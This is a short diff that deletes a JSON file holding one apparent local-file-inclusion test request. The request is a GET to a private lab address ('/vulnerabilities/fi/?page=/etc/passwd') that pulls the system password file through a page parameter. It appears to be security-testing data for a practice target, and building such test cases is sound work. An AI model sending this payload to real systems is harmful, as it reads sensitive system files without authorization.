@@ -1,8 +1,0 @@
-{
-    " LFI": [
-        {
-            "method": "GET",
-            "url": "http://192.168.112.130/vulnerabilities/fi/?page=/etc/passwd"
-        }
-    ]
-}
